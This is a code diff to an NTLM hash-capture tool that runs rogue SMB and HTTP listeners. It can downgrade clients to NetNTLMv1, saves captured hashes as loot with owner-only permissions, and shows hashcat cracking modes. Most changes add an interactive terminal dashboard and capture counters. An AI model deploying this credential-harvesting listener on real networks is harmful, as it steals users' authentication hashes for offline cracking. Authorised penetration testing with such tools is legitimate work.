@@ -34,7 +34,9 @@ import datetime
 import itertools
 import os
 import re
+import select
 import shutil
+import signal
 import socket
 import socketserver
 import ssl
@@ -43,7 +45,13 @@ import sys
 import threading
 import time
 import traceback
-import textwrap
+import unicodedata
+try:
+    import termios
+    import tty
+except ImportError:
+    termios = None
+    tty = None
 from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
 
 # ---- NTLM constants --------------------------------------------------------
@@ -275,12 +283,30 @@ def smb2_session_setup_resp(msg_id, session_id, status, secbuf):
 
 # ---- capture sink ----------------------------------------------------------
 
+def _open_private(path, mode="a", buffering=-1):
+    """Open a loot file with owner-only permissions, including existing files."""
+    flags = os.O_WRONLY | os.O_CREAT
+    flags |= os.O_APPEND if "a" in mode else os.O_TRUNC
+    fd = os.open(path, flags, 0o600)
+    try:
+        os.chmod(path, 0o600)
+        return os.fdopen(fd, mode, buffering=buffering)
+    except Exception:
+        os.close(fd)
+        raise
+
+
 class Sink:
-    def __init__(self, outdir, challenge_hex):
+    def __init__(self, outdir, challenge_hex, stats=None):
         self.outdir = outdir
         self.challenge_hex = challenge_hex
+        self.stats = stats
         self.lock = threading.Lock()
         os.makedirs(outdir, exist_ok=True)
+        try:
+            os.chmod(outdir, 0o700)
+        except OSError:
+            pass
         self.v1_file = os.path.join(outdir, "netntlmv1.txt")
         self.v2_file = os.path.join(outdir, "netntlmv2.txt")
         self.log_file = os.path.join(outdir, "capture.log")
@@ -343,6 +369,13 @@ class Sink:
         with self.lock:
             dup = hashline in self.seen
             self.seen.add(hashline)
+            if self.stats is not None:
+                self.stats["captures_total"] += 1
+                if t.is_v1:
+                    self.stats["captures_v1"] += 1
+                else:
+                    self.stats["captures_v2"] += 1
+                self.stats["last_capture"] = "%s\\%s (%s)" % (t.domain or "-", t.user or "-", kind)
 
         C = Color
         print(C.b("\n[+] [%s] NTLM %s captured  <- %s" % (source, kind, client_ip)))
@@ -370,43 +403,137 @@ class Sink:
                % (stamp, source, client_ip, kind, t.domain, t.user, t.host,
                   t.flags, hashline))
         with self.lock:
-            with open(self.log_file, "a") as fh:
+            with _open_private(self.log_file) as fh:
                 fh.write(rec + "\n")
             capture_file = self._write_capture_file(
                 captured_at, client_ip, t, source, kind, hashline)
             if not dup:
                 target = self.v1_file if t.is_v1 else self.v2_file
-                with open(target, "a") as fh:
+                with _open_private(target) as fh:
                     fh.write(hashline + "\n")
         print(C.d("    saved       : %s" % capture_file))
 
 
-# ---- color -----------------------------------------------------------------
+# ---- color & ANSI formatting -----------------------------------------------
+
+_ANSI_RE = re.compile(r"(\x1b\[[0-9;]*[a-zA-Z])")
+
+
+def strip_ansi(s):
+    return _ANSI_RE.sub("", s) if s else ""
+
+
+def visible_len(s):
+    return sum(_char_width(ch) for ch in strip_ansi(s))
+
+
+def _char_width(ch):
+    """Best-effort terminal cell width without third-party dependencies."""
+    if unicodedata.combining(ch):
+        return 0
+    return 2 if unicodedata.east_asian_width(ch) in ("W", "F") else 1
+
+
+def ansi_fit(s, width):
+    """Pad or truncate string to exact visible width, preserving ANSI sequences."""
+    if width <= 0:
+        return ""
+    tokens = _ANSI_RE.split(s)
+    res = []
+    vis = 0
+    had_escape = False
+    for token in tokens:
+        if not token:
+            continue
+        if token.startswith("\x1b["):
+            res.append(token)
+            had_escape = True
+        else:
+            for ch in token:
+                cells = _char_width(ch)
+                if vis + cells > width:
+                    break
+                res.append(ch)
+                vis += cells
+            if vis >= width:
+                break
+    if had_escape:
+        res.append("\x1b[0m")
+    if vis < width:
+        res.append(" " * (width - vis))
+    return "".join(res)
+
+
+def ansi_wrap(s, width):
+    """Wrap string containing ANSI codes into lines of visible length <= width."""
+    if width <= 0:
+        return [s]
+    tokens = _ANSI_RE.split(s)
+    lines = []
+    cur_line = []
+    cur_vis = 0
+    active_escapes = []
+    for token in tokens:
+        if not token:
+            continue
+        if token.startswith("\x1b["):
+            cur_line.append(token)
+            if token == "\x1b[0m":
+                active_escapes = []
+            else:
+                active_escapes.append(token)
+        else:
+            for ch in token:
+                cells = _char_width(ch)
+                if cur_vis and cur_vis + cells > width:
+                    if active_escapes:
+                        cur_line.append("\x1b[0m")
+                    lines.append("".join(cur_line))
+                    cur_line = list(active_escapes)
+                    cur_vis = 0
+                    if ch == " ":
+                        continue
+                cur_line.append(ch)
+                cur_vis += cells
+    if cur_line:
+        if active_escapes:
+            cur_line.append("\x1b[0m")
+        lines.append("".join(cur_line))
+    return lines or [""]
+
 
 class Color:
     on = sys.stdout.isatty()
+
+    @classmethod
+    def set_on(cls, enabled):
+        cls.on = bool(enabled)
 
     @staticmethod
     def _w(s, c):
         return "\033[%sm%s\033[0m" % (c, s) if Color.on else s
 
     @staticmethod
-    def b(s): return Color._w(s, "1;36")
-
+    def b(s): return Color._w(s, "1;36")      # Bold Cyan
     @staticmethod
-    def g(s): return Color._w(s, "1;32")
-
+    def g(s): return Color._w(s, "1;32")      # Bold Green
     @staticmethod
-    def y(s): return Color._w(s, "1;33")
-
+    def y(s): return Color._w(s, "1;33")      # Bold Yellow
     @staticmethod
-    def d(s): return Color._w(s, "0;90")
+    def r(s): return Color._w(s, "1;31")      # Bold Red
+    @staticmethod
+    def m(s): return Color._w(s, "1;35")      # Bold Magenta
+    @staticmethod
+    def w(s): return Color._w(s, "1;37")      # Bold White
+    @staticmethod
+    def d(s): return Color._w(s, "0;90")      # Dim / Gray
+    @staticmethod
+    def c(s): return Color._w(s, "0;36")      # Standard Cyan
+    @staticmethod
+    def blue(s): return Color._w(s, "1;34")   # Bold Blue
 
 
 # ---- persistent full console log ------------------------------------------
-
-_ANSI = re.compile(r"\x1b\[[0-9;]*m")
-
 
 class _Tee:
     """Mirror everything printed to the console into a file (ANSI stripped),
@@ -416,9 +543,15 @@ class _Tee:
         self._stream = stream
         self._fh = fh
 
+    def isatty(self):
+        return hasattr(self._stream, "isatty") and self._stream.isatty()
+
+    def fileno(self):
+        return self._stream.fileno()
+
     def write(self, s):
         self._stream.write(s)
-        self._fh.write(_ANSI.sub("", s))
+        self._fh.write(strip_ansi(s))
         return len(s)
 
     def flush(self):
@@ -426,90 +559,584 @@ class _Tee:
         self._fh.flush()
 
 
+_IP_PORT_RE = re.compile(r"\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})(?::(\d+))?\b")
+
+
+def _colorize_raw(line):
+    """Subtle syntax highlighting for raw protocol log if uncolored."""
+    if "\x1b[" in line:
+        return line
+    s = line
+    s = _IP_PORT_RE.sub(lambda m: "\x1b[36m" + m.group(1) + ("\x1b[90m:\x1b[36m" + m.group(2) if m.group(2) else "") + "\x1b[0m", s)
+    s = re.sub(r"(\[(?:smb(?:\s+wire)?|http)\])", lambda m: "\x1b[1;34m" + m.group(1) + "\x1b[0m", s)
+    s = re.sub(r"(\[(?:smb|http)\s+conn\s+#[0-9]+[^\]]*\])", lambda m: "\x1b[90m" + m.group(1) + "\x1b[0m", s)
+    s = re.sub(r"(SESSION_SETUP|NEGOTIATE)", lambda m: "\x1b[1;33m" + m.group(1) + "\x1b[0m", s)
+    s = re.sub(r"(Type-[123])", lambda m: "\x1b[1;35m" + m.group(1) + "\x1b[0m", s)
+    s = re.sub(r"(\[!\].*)", lambda m: "\x1b[1;33m" + m.group(1) + "\x1b[0m", s)
+    s = re.sub(r"(\[\+\].*)", lambda m: "\x1b[1;32m" + m.group(1) + "\x1b[0m", s)
+    return s
+
+
+def _format_event(line):
+    """Format meaningful protocol event for the left dashboard pane."""
+    plain = strip_ansi(line).strip()
+    if not plain:
+        return None
+    if plain.startswith("[smb wire]"):
+        return None
+    if plain.startswith("ntlm_catch") or plain.startswith("challenge   :") or \
+       plain.startswith("downgrade   :") or plain.startswith("advertising :") or \
+       plain.startswith("loot dir    :") or plain.startswith("no poisoning"):
+        return None
+
+    now = datetime.datetime.now().strftime("%H:%M:%S")
+    ts = f"\x1b[90m{now}\x1b[0m"
+    pad = "          "
+
+    # Capture header
+    m = re.search(r"\[\+\]\s+\[(\w+)\]\s+NTLM\s+(\S+)\s+captured\s+<-\s+([0-9.]+)", plain)
+    if m:
+        proto, kind, ip = m.groups()
+        pcol = "\x1b[1;34m" if proto.lower() == "smb" else "\x1b[1;35m"
+        return f"{ts} \x1b[1;32m● CAPTURE\x1b[0m {pcol}[{proto}]\x1b[0m \x1b[1;37m{kind}\x1b[0m <- \x1b[1;36m{ip}\x1b[0m"
+
+    # Capture details
+    if plain.startswith("account     :"):
+        val = plain.split(":", 1)[1].strip()
+        return f"{pad}\x1b[90maccount    :\x1b[0m \x1b[1;33m{val}\x1b[0m"
+    if plain.startswith("workstation :"):
+        val = plain.split(":", 1)[1].strip()
+        return f"{pad}\x1b[90mworkstation:\x1b[0m \x1b[1;37m{val}\x1b[0m"
+    if plain.startswith("hashcat -m"):
+        return f"{pad}\x1b[1;33m{plain}\x1b[0m"
+    if plain.startswith("saved       :"):
+        path = plain.split(":", 1)[1].strip()
+        base = os.path.basename(path)
+        return f"{pad}\x1b[90msaved      :\x1b[0m \x1b[0;32m{base}\x1b[0m"
+    if "* downgrade OK" in plain:
+        return f"{pad}\x1b[1;32m* downgrade OK (pure NetNTLMv1)\x1b[0m"
+    if "* client stayed" in plain:
+        return f"{pad}\x1b[1;33m* client stayed on NetNTLMv2\x1b[0m"
+    if "(duplicate" in plain:
+        return f"{pad}\x1b[90m(duplicate hash)\x1b[0m"
+    if "::" in plain and not plain.startswith("http"):
+        h = plain.strip()
+        return f"{pad}\x1b[0;36m{h[:64]}...\x1b[0m" if len(h) > 64 else f"{pad}\x1b[0;36m{h}\x1b[0m"
+
+    # TCP connection
+    m = re.search(r"\[(\w+)\s+conn\s+#(\d+)\s+([\d:]+)\]\s+TCP from\s+([0-9.]+:\d+)", plain)
+    if m:
+        proto, cnum, conn_ts, addr = m.groups()
+        pcol = "\x1b[1;34m" if proto.lower() == "smb" else "\x1b[1;35m"
+        return f"\x1b[90m{conn_ts}\x1b[0m {pcol}[{proto}]\x1b[0m TCP from \x1b[1;36m{addr}\x1b[0m \x1b[90m(#{cnum})\x1b[0m"
+
+    # SMB Stages
+    m = re.search(r"\[smb\]\s+([0-9.]+)\s+SESSION_SETUP\s+\(Type-([13])\)", plain)
+    if m:
+        ip, t_num = m.groups()
+        if t_num == "1":
+            return f"{ts} \x1b[1;34m[SMB]\x1b[0m \x1b[1;36m{ip}\x1b[0m Type-1 -> \x1b[1;33mChallenge Sent\x1b[0m"
+        else:
+            return f"{ts} \x1b[1;34m[SMB]\x1b[0m \x1b[1;36m{ip}\x1b[0m Type-3 \x1b[1;35mAuth Received\x1b[0m"
+
+    m = re.search(r"\[smb\]\s+([0-9.]+)\s+NEGOTIATE", plain)
+    if m:
+        ip = m.group(1)
+        return f"{ts} \x1b[1;34m[SMB]\x1b[0m \x1b[1;36m{ip}\x1b[0m NEGOTIATE"
+
+    # HTTP Stages
+    m = re.search(r"\[http\]\s+([A-Z]+)\s+(\S+)\s+from\s+([0-9.]+)\s+\(auth:\s*([^)]*)\)", plain)
+    if m:
+        method, path, ip, auth = m.groups()
+        if "no-auth" in auth:
+            return f"{ts} \x1b[1;35m[HTTP]\x1b[0m \x1b[1;36m{ip}\x1b[0m {method} {path} \x1b[90m(no auth -> 401)\x1b[0m"
+        else:
+            return f"{ts} \x1b[1;35m[HTTP]\x1b[0m \x1b[1;36m{ip}\x1b[0m {method} {path} \x1b[1;33m(auth: {auth})\x1b[0m"
+
+    m = re.search(r"\[http\]\s+([0-9.]+)\s+Type-1\s+->\s+challenge sent", plain)
+    if m:
+        ip = m.group(1)
+        return f"{ts} \x1b[1;35m[HTTP]\x1b[0m \x1b[1;36m{ip}\x1b[0m Type-1 -> \x1b[1;33mChallenge Sent\x1b[0m"
+
+    # Warnings / Errors
+    if "[!]" in plain:
+        return f"{ts} \x1b[1;33m{plain}\x1b[0m"
+
+    # Listener start
+    m = re.search(r"\[\+\]\s+(SMB|HTTP)\s+listening on\s+(\S+)", plain)
+    if m:
+        proto, ep = m.groups()
+        pcol = "\x1b[1;34m" if proto.upper() == "SMB" else "\x1b[1;35m"
+        return f"{ts} \x1b[1;32m[+]\x1b[0m {pcol}{proto}\x1b[0m online at \x1b[1;36m{ep}\x1b[0m"
+
+    # Other relevant markers
+    if any(marker in plain for marker in ("closed/reset", "timeout", "anonymous", "stopped", "stopping")):
+        return f"{ts} \x1b[90m{plain}\x1b[0m"
+
+    return None
+
+
 class _SplitView:
-    """TTY dashboard: useful protocol events left, complete raw log right."""
+    """Dynamic TTY dashboard: colored protocol events left, live raw log right."""
 
-    _INFO_MARKERS = (
-        "TCP from", "attempt stage:", "SESSION_SETUP", "[http]", "NTLM ",
-        "challenge", "downgrade", "captured", "account", "workstation",
-        "client stayed", "saved", "anonymous", "listening", "[!]", "[+]",
-        "stopping", "stopped",
-    )
+    _PULSE_COLORS = ("1;32", "1;32", "0;32", "0;90", "0;32", "1;32")
 
-    def __init__(self, stream, log_fh):
+    def __init__(self, stream, log_fh, stats=None):
         self._stream = stream
         self._log_fh = log_fh
-        self._raw = collections.deque(maxlen=1000)
-        self._info = collections.deque(maxlen=500)
+        self._stats = stats or {}
+        self._raw = collections.deque(maxlen=2000)
+        self._info = collections.deque(maxlen=1000)
         self._partial = ""
         self._lock = threading.RLock()
         self._closed = False
-        self._stream.write("\033[?1049h\033[?25l")
+        self._needs_clear = False
+        self._last_render = 0.0
+        self._tick_count = 0
+        self._stop_ticker = threading.Event()
+
+        self._active_pane = "right"
+        self._scroll_left = 0
+        self._scroll_right = 0
+
+        self._stdin_fd = None
+        self._old_termios = None
+        if termios is not None and tty is not None and hasattr(sys.stdin, "fileno") and sys.stdin.isatty():
+            try:
+                self._stdin_fd = sys.stdin.fileno()
+                self._old_termios = termios.tcgetattr(self._stdin_fd)
+                tty.setcbreak(self._stdin_fd)
+            except Exception:
+                self._stdin_fd = None
+                self._old_termios = None
+
+        # Switch to alternate screen, hide cursor, and enable SGR mouse tracking
+        self._stream.write("\033[?1049h\033[?25l\033[?1000h\033[?1006h")
+        self._stream.flush()
+
+        # SIGWINCH resize listener
+        self._old_sigwinch = None
+        if hasattr(signal, "SIGWINCH"):
+            try:
+                self._old_sigwinch = signal.signal(signal.SIGWINCH, self._on_sigwinch)
+            except Exception:
+                pass
+
+        # Start dynamic periodic repainting thread (4 Hz)
+        self._ticker = threading.Thread(target=self._ticker_loop, daemon=True, name="split-view-ticker")
+        self._ticker.start()
+
+        # Start interactive keyboard/mouse input thread
+        if self._stdin_fd is not None:
+            self._input_thread = threading.Thread(target=self._input_loop, daemon=True, name="split-view-input")
+            self._input_thread.start()
+
         self._render()
+
+    def isatty(self):
+        return hasattr(self._stream, "isatty") and self._stream.isatty()
+
+    def fileno(self):
+        return self._stream.fileno()
 
     @staticmethod
     def available(stream):
         size = shutil.get_terminal_size((120, 30))
-        return stream.isatty() and size.columns >= 100 and size.lines >= 16
+        return stream.isatty() and size.columns >= 76 and size.lines >= 14
+
+    def _on_sigwinch(self, signum, frame):
+        with self._lock:
+            self._needs_clear = True
+        self._render()
+        if callable(self._old_sigwinch):
+            try:
+                self._old_sigwinch(signum, frame)
+            except Exception:
+                pass
+
+    def _ticker_loop(self):
+        while not self._stop_ticker.is_set():
+            self._tick_count += 1
+            self._render()
+            self._stop_ticker.wait(0.25)
+
+    def _parse_input(self, buf):
+        actions = []
+        i = 0
+        n = len(buf)
+        while i < n:
+            if buf[i:i+1] == "\x1b":
+                if i + 1 == n:
+                    # Keep an incomplete escape sequence for the next read.
+                    break
+                if buf[i+1] == "[":
+                    if i + 2 < n and buf[i+2] == "<":
+                        end = i + 3
+                        while end < n and buf[end] not in ("M", "m"):
+                            end += 1
+                        if end < n:
+                            seq = buf[i+3:end]
+                            parts = seq.split(";")
+                            btn_code = parts[0] if parts else ""
+                            x_coord = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 0
+                            actions.append(("mouse", btn_code, x_coord, buf[end]))
+                            i = end + 1
+                            continue
+                        else:
+                            break
+                    end = i + 2
+                    while end < n and not (buf[end].isalpha() or buf[end] == "~"):
+                        end += 1
+                    if end < n:
+                        seq = buf[i+2:end+1]
+                        if seq == "A": actions.append("up")
+                        elif seq == "B": actions.append("down")
+                        elif seq == "C": actions.append("right")
+                        elif seq == "D": actions.append("left")
+                        elif seq in ("5~", "I"): actions.append("page_up")
+                        elif seq in ("6~", "G"): actions.append("page_down")
+                        elif seq in ("H", "1~"): actions.append("home")
+                        elif seq in ("F", "4~"): actions.append("end")
+                        i = end + 1
+                        continue
+                    else:
+                        break
+                elif buf[i+1] == "O":
+                    if i + 2 < n:
+                        c = buf[i+2]
+                        if c == "A": actions.append("up")
+                        elif c == "B": actions.append("down")
+                        elif c == "C": actions.append("right")
+                        elif c == "D": actions.append("left")
+                        elif c == "H": actions.append("home")
+                        elif c == "F": actions.append("end")
+                        i += 3
+                        continue
+                    else:
+                        break
+                else:
+                    actions.append("esc")
+                    i += 1
+            else:
+                ch = buf[i]
+                if ch in ("k", "K"): actions.append("up")
+                elif ch in ("j", "J"): actions.append("down")
+                elif ch in ("\t",): actions.append("tab")
+                elif ch in ("q", "Q"): actions.append("quit")
+                elif ch in ("g",): actions.append("home")
+                elif ch in ("G",): actions.append("end")
+                elif ch in ("u",): actions.append("half_page_up")
+                elif ch in ("d",): actions.append("half_page_down")
+                elif ch in ("f", " "): actions.append("page_down")
+                elif ch in ("b",): actions.append("page_up")
+                elif ch == "\x03": actions.append("interrupt")
+                i += 1
+        return actions, buf[i:]
+
+    def _handle_action(self, act):
+        size = shutil.get_terminal_size((120, 30))
+        body_height = max(1, size.lines - 6)
+        page_step = max(1, body_height - 2)
+
+        if act == "up":
+            if self._active_pane == "left":
+                self._scroll_left += 1
+            else:
+                self._scroll_right += 1
+        elif act == "down":
+            if self._active_pane == "left":
+                self._scroll_left = max(0, self._scroll_left - 1)
+            else:
+                self._scroll_right = max(0, self._scroll_right - 1)
+        elif act in ("page_up", "half_page_up"):
+            step = page_step if act == "page_up" else max(1, body_height // 2)
+            if self._active_pane == "left":
+                self._scroll_left += step
+            else:
+                self._scroll_right += step
+        elif act in ("page_down", "half_page_down"):
+            step = page_step if act == "page_down" else max(1, body_height // 2)
+            if self._active_pane == "left":
+                self._scroll_left = max(0, self._scroll_left - step)
+            else:
+                self._scroll_right = max(0, self._scroll_right - step)
+        elif act == "home":
+            if self._active_pane == "left":
+                self._scroll_left = 999999
+            else:
+                self._scroll_right = 999999
+        elif act == "end":
+            if self._active_pane == "left":
+                self._scroll_left = 0
+            else:
+                self._scroll_right = 0
+        elif act in ("tab", "left", "right"):
+            if act == "left":
+                self._active_pane = "left"
+            elif act == "right":
+                self._active_pane = "right"
+            else:
+                self._active_pane = "left" if self._active_pane == "right" else "right"
+        elif isinstance(act, tuple) and act[0] == "mouse":
+            btn, x = act[1], act[2]
+            left_w = max(34, int(size.columns * 0.46))
+            target = "left" if x <= left_w + 1 else "right"
+            if btn == "64":  # wheel up
+                self._active_pane = target
+                if target == "left":
+                    self._scroll_left += 3
+                else:
+                    self._scroll_right += 3
+            elif btn == "65":  # wheel down
+                self._active_pane = target
+                if target == "left":
+                    self._scroll_left = max(0, self._scroll_left - 3)
+                else:
+                    self._scroll_right = max(0, self._scroll_right - 3)
+            elif btn == "0":  # click
+                self._active_pane = target
+        elif act in ("quit", "interrupt"):
+            try:
+                os.kill(os.getpid(), signal.SIGINT)
+            except Exception:
+                pass
+
+    def _input_loop(self):
+        buf = ""
+        while not self._stop_ticker.is_set() and not self._closed:
+            try:
+                r, _, _ = select.select([self._stdin_fd], [], [], 0.1)
+                if not r:
+                    continue
+                chunk = os.read(self._stdin_fd, 1024)
+                if not chunk:
+                    break
+                buf += chunk.decode("utf-8", errors="replace")
+                actions, buf = self._parse_input(buf)
+                if actions:
+                    with self._lock:
+                        for act in actions:
+                            self._handle_action(act)
+                    self._render()
+            except Exception:
+                break
 
     def write(self, data):
         if not data:
             return 0
-        plain = _ANSI.sub("", data)
+        plain = strip_ansi(data)
         with self._lock:
             self._log_fh.write(plain)
-            self._partial += plain
+            self._partial += data
             while "\n" in self._partial:
                 line, self._partial = self._partial.split("\n", 1)
-                self._raw.append(line)
-                if line.strip() and any(marker in line
-                                        for marker in self._INFO_MARKERS):
-                    now = datetime.datetime.now().strftime("%H:%M:%S")
-                    self._info.append("%s  %s" % (now, line.strip()))
-            self._render()
+                self._add_line(line)
+            now = time.time()
+            if now - self._last_render >= 0.04:
+                self._render()
         return len(data)
+
+    def _add_line(self, line):
+        raw_colored = _colorize_raw(line)
+        self._raw.append(raw_colored)
+        evt = _format_event(line)
+        if evt:
+            self._info.append(evt)
 
     def flush(self):
         with self._lock:
-            self._log_fh.flush()
+            try:
+                self._log_fh.flush()
+            except Exception:
+                pass
+            try:
+                self._stream.flush()
+            except Exception:
+                pass
 
     @staticmethod
-    def _visible(lines, width, height):
+    def _visible(lines, width, height, offset=0):
         wrapped = []
         for line in lines:
-            wrapped.extend(textwrap.wrap(line, width=width,
-                                         replace_whitespace=False,
-                                         drop_whitespace=False) or [""])
-        return wrapped[-height:]
+            wrapped.extend(ansi_wrap(line, width))
+        if not wrapped:
+            return [], 0
+        max_offset = max(0, len(wrapped) - height)
+        eff_offset = min(max(0, offset), max_offset)
+        if eff_offset == 0:
+            return wrapped[-height:], 0
+        else:
+            start = max(0, len(wrapped) - height - eff_offset)
+            end = len(wrapped) - eff_offset
+            return wrapped[start:end], eff_offset
+
+    def _build_top_bar(self, width):
+        pcol = self._PULSE_COLORS[self._tick_count % len(self._PULSE_COLORS)]
+        pulse_str = f"\033[{pcol}m●\033[0m \033[1;32mLISTENING\033[0m"
+        title = "\033[1;36mNTLM-CATCH\033[0m"
+
+        ports = []
+        if self._stats.get("smb_port"):
+            ports.append(f"\033[1;34mSMB:{self._stats['smb_port']}\033[0m")
+        if self._stats.get("http_port"):
+            ports.append(f"\033[1;35mHTTP:{self._stats['http_port']}\033[0m")
+        ports_str = " ".join(ports)
+
+        dg_on = self._stats.get("downgrade", True)
+        dg_str = "\033[1;32mDG:ON\033[0m" if dg_on else "\033[1;33mDG:OFF\033[0m"
+
+        tot = self._stats.get("captures_total", 0)
+        v1 = self._stats.get("captures_v1", 0)
+        v2 = self._stats.get("captures_v2", 0)
+        conns = self._stats.get("connections", 0)
+
+        start_t = self._stats.get("start_time", time.time())
+        up = int(time.time() - start_t)
+        h, r = divmod(up, 3600)
+        m, s = divmod(r, 60)
+        up_str = f"\033[1;37m{h:02d}:{m:02d}:{s:02d}\033[0m"
+
+        sep = " \033[90m│\033[0m "
+        if width >= 115:
+            items = [
+                title,
+                pulse_str,
+                ports_str,
+                dg_str,
+                f"Captures: \033[1;32m{tot}\033[0m (\033[1;36mv1:{v1}\033[0m, \033[1;33mv2:{v2}\033[0m)",
+                f"\033[90mConns:{conns}\033[0m",
+                up_str,
+            ]
+        elif width >= 90:
+            items = [
+                title,
+                pulse_str,
+                ports_str,
+                f"Cap: \033[1;32m{tot}\033[0m (\033[1;36mv1:{v1}\033[0m,\033[1;33mv2:{v2}\033[0m)",
+                up_str,
+            ]
+        else:
+            items = [
+                title,
+                pulse_str,
+                f"Cap:\033[1;32m{tot}\033[0m",
+                up_str,
+            ]
+        return ansi_fit(sep.join(items), width)
+
+    def _build_footer_bar(self, width):
+        outdir = self._stats.get("outdir", "loot")
+        sep = " \033[90m│\033[0m "
+        is_scrolled = (self._scroll_left > 0) or (self._scroll_right > 0)
+        nav_hint = "\033[1;33mEnd: Live\033[0m" if is_scrolled else "\033[90m↑/↓: Scroll\033[0m"
+
+        if width >= 115:
+            items = [
+                "\033[1;37mTab: Pane\033[0m",
+                nav_hint,
+                "\033[90mPgUp/Dn\033[0m",
+                f"\033[90mLoot:\033[0m \033[0;32m{outdir}/\033[0m",
+                "\033[1;33m-m 5500\033[0m / \033[1;33m-m 5600\033[0m",
+                "\033[1;37mq/Ctrl+C: Stop\033[0m",
+            ]
+        elif width >= 90:
+            items = [
+                "\033[1;37mTab: Pane\033[0m",
+                nav_hint,
+                f"\033[90mLoot:\033[0m \033[0;32m{outdir}/\033[0m",
+                "\033[1;37mq: Stop\033[0m",
+            ]
+        else:
+            items = [
+                "\033[1;37mTab: Pane\033[0m",
+                nav_hint,
+                "\033[1;37mq: Stop\033[0m",
+            ]
+        return ansi_fit(sep.join(items), width)
 
     def _render(self):
-        if self._closed:
-            return
-        size = shutil.get_terminal_size((120, 30))
-        width, height = size.columns, size.lines
-        left_width = max(38, width * 45 // 100)
-        right_width = width - left_width - 3
-        body_height = max(1, height - 3)
-        left = self._visible(self._info, left_width, body_height)
-        right = self._visible(self._raw, right_width, body_height)
-        rows = [" EVENTS".ljust(left_width) + " | RAW LOG"]
-        rows.append(("=" * left_width) + "=+=" + ("=" * right_width))
-        for i in range(body_height):
-            lval = left[i] if i < len(left) else ""
-            rval = right[i] if i < len(right) else ""
-            rows.append(lval[:left_width].ljust(left_width) + " | " +
-                        rval[:right_width])
-        self._stream.write("\033[H" + "\n".join(rows))
-        self._stream.flush()
+        with self._lock:
+            if self._closed:
+                return
+            size = shutil.get_terminal_size((120, 30))
+            width, height = size.columns, size.lines
+
+            if width < 60 or height < 10:
+                msg = ansi_fit(f" Terminal too small ({width}x{height}) — resize to >=76x14 ", width)
+                self._stream.write("\033[H\033[2J" + msg)
+                self._stream.flush()
+                return
+
+            left_width = max(34, int(width * 0.46))
+            sep_width = 3
+            right_width = width - left_width - sep_width
+            body_height = max(1, height - 6)
+
+            left, self._scroll_left = self._visible(self._info, left_width, body_height, self._scroll_left)
+            right, self._scroll_right = self._visible(self._raw, right_width, body_height, self._scroll_right)
+
+            top_bar = self._build_top_bar(width)
+            div_top = "\033[90m" + ("─" * (left_width + 1)) + "┬" + ("─" * (right_width + 1)) + "\033[0m"
+
+            left_badge = " \033[1;36;7m EVENTS & CAPTURES \033[0m" if self._active_pane == "left" else " \033[1;36mEVENTS & CAPTURES\033[0m"
+            if self._scroll_left > 0:
+                left_badge += f" \033[1;33m▲ -{self._scroll_left}\033[0m"
+
+            right_badge = " \033[1;33;7m RAW LOG & WIRE DIAGNOSTICS \033[0m" if self._active_pane == "right" else " \033[1;33mRAW LOG & WIRE DIAGNOSTICS\033[0m"
+            if self._scroll_right > 0:
+                right_badge += f" \033[1;33m▲ -{self._scroll_right}\033[0m"
+
+            col_hdr = ansi_fit(left_badge, left_width + 1) + \
+                      "\033[90m│\033[0m" + \
+                      ansi_fit(right_badge, right_width + 1)
+            div_mid = "\033[90m" + ("─" * (left_width + 1)) + "┼" + ("─" * (right_width + 1)) + "\033[0m"
+
+            rows = [top_bar, div_top, col_hdr, div_mid]
+            for i in range(body_height):
+                lval = left[i] if i < len(left) else ""
+                rval = right[i] if i < len(right) else ""
+                rows.append(ansi_fit(lval, left_width) + " \033[90m│\033[0m " + ansi_fit(rval, right_width))
+
+            div_bot = "\033[90m" + ("─" * (left_width + 1)) + "┴" + ("─" * (right_width + 1)) + "\033[0m"
+            footer_bar = self._build_footer_bar(width)
+            rows.append(div_bot)
+            rows.append(footer_bar)
+
+            clear_prefix = "\033[2J" if self._needs_clear else ""
+            self._needs_clear = False
+            frame = clear_prefix + "\033[H" + "\n".join(r + "\033[K" for r in rows) + "\033[J"
+            try:
+                self._stream.write(frame)
+                self._stream.flush()
+            except Exception:
+                pass
+            self._last_render = time.time()
 
     def close(self):
         with self._lock:
             if self._closed:
                 return
             self._closed = True
-            self._log_fh.flush()
-            self._stream.write("\033[?25h\033[?1049l")
-            self._stream.flush()
+            self._stop_ticker.set()
+            if hasattr(signal, "SIGWINCH") and self._old_sigwinch is not None:
+                try:
+                    signal.signal(signal.SIGWINCH, self._old_sigwinch)
+                except Exception:
+                    pass
+            if self._stdin_fd is not None and self._old_termios is not None:
+                try:
+                    termios.tcsetattr(self._stdin_fd, termios.TCSADRAIN, self._old_termios)
+                except Exception:
+                    pass
+            try:
+                self._log_fh.flush()
+            except Exception:
+                pass
+            try:
+                self._stream.write("\033[?1000l\033[?1006l\033[?25h\033[?1049l")
+                self._stream.flush()
+            except Exception:
+                pass
 
 
 # ---- loud connection logging (shared by both servers) ----------------------
@@ -517,19 +1144,23 @@ class _SplitView:
 class _Loud:
     """Mixin: announce every accepted TCP connection + surface handler errors."""
 
-    def _loud_init(self, tag, verbose, socket_timeout):
+    def _loud_init(self, tag, verbose, socket_timeout, stats=None):
         self._tag = tag
         self._verbose = verbose
         self._counter = itertools.count(1)
         self._clock = threading.Lock()
         self._accepted = 0
         self._socket_timeout = socket_timeout
+        self._stats = stats
 
     def get_request(self):
         sock, addr = self.socket.accept()
         with self._clock:
             n = next(self._counter)
             self._accepted += 1
+            if self._stats is not None:
+                self._stats["connections"] += 1
+                self._stats["last_conn"] = "%s:%d (%s)" % (addr[0], addr[1], self._tag.upper())
         sock.settimeout(self._socket_timeout)
         ts = datetime.datetime.now().strftime("%H:%M:%S")
         print(Color.d("[%s conn #%d %s] TCP from %s:%d"
@@ -850,9 +1481,9 @@ class LoudSMBServer(_Loud, socketserver.ThreadingTCPServer):
     daemon_threads = True
 
     def __init__(self, addr, sink, challenge8, domain, computer,
-                 downgrade, verbose, socket_timeout):
+                 downgrade, verbose, socket_timeout, stats=None):
         super().__init__(addr, SMBHandler)
-        self._loud_init("smb", verbose, socket_timeout)
+        self._loud_init("smb", verbose, socket_timeout, stats)
         self.sink = sink
         self.challenge8 = challenge8
         self.domain = domain
@@ -928,6 +1559,7 @@ def make_http_handler(sink, challenge8, domain, computer, downgrade, verbose):
 
             mtype = _u32(token, 8)
             if mtype == 1:
+                print(Color.d("    [http] %s Type-1 -> challenge sent" % ip))
                 t2 = build_type2(challenge8, domain, computer, downgrade)
